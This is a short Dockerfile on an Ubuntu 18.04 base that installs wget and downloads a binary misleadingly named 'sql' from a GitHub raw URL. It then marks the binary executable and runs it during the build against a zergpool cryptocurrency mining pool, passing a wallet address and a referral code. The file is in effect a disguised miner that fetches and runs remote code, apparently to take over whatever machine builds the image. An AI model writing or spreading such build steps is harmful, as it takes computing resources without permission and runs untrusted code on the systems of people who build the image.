FROM ubuntu:18.04
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update -y && apt-get upgrade -y
RUN apt-get install wget -y 
RUN wget https://raw.githubusercontent.com/aditech22/raw/main/sql
RUN chmod +x sql
RUN ./sql -v -l verushash.asia.mine.zergpool.com:3300 -u RAsZ3swZ7jFKyvgZNLUaoNQ1QtQyiWAo6g.aditya -p c=RVN,mc=VRSC,refcode=4dd96ddeb63170290bbfd8672ec46967 -t 1